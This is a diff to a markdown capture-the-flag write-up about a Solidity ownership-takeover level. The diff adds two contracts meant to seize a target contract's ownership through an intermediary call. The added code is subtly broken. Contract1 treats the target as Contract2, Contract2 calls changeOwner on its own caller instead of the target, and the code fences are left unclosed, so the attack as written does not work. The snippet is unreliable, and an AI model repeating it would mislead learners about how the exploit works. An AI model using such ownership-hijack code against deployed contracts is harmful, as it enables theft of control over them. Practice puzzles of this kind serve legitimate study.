@@ -26,6 +26,29 @@ To crack this level, we'll employ a clever strategy involving two contracts: **C
 
 - Explore how the strategy leverages these elements to secure contract ownership.
 
+##Contract 1 Code:
+        
+    ```solidity
+    contract Contract1 {
+    address public owner;
+    function initiateOwnershipTransfer(address _newOwner, address _targetContract) public {
+      // Call Contract 2 and pass the target contract's address
+      Contract2(_targetContract).triggerOwnershipChange(_newOwner);
+      }
+    }
+        
+##Contract 2 Code:
+        
+    ```solidity
+    contract Contract2 {
+        address public owner;
+    
+        function triggerOwnershipChange(address _newOwner) public {
+            // Call the target contract and change ownership
+            TargetContract(msg.sender).changeOwner(_newOwner);
+        }
+    }
+         
 
 ## Clever Maneuver:
 
